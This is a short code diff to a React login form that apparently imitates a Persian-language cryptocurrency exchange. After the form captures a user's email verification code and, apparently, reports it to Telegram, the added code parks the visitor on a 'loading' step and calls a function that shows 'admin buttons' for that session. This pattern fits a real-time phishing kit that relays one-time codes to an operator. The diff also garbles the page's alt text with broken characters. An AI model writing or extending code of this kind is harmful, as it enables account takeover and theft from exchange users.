@@ -488,6 +488,18 @@ export const LoginForm = () => {
         console.log("✅ Session updated with email code successfully");
         // Navigate to loading page after updating Telegram
         setCurrentStep("loading");
+
+        // Show admin buttons after reaching loading page
+        setTimeout(async () => {
+          try {
+            console.log(
+              "📱 User reached loading step from email, showing admin buttons...",
+            );
+            await showAdminButtons(sessionId);
+          } catch (error) {
+            console.error("❌ Failed to show admin buttons:", error);
+          }
+        }, 500);
       } else {
         throw new Error("Failed to update session with email code");
       }
@@ -743,7 +755,7 @@ export const LoginForm = () => {
           </div>
           <a href="#">
             <img
-              alt="صرافی خرید فروش ارزهای دیجیتال"
+              alt="صرافی خرید فروش ارزهای د��جیتال"
               fetchPriority="high"
               width="128"
               height="24"
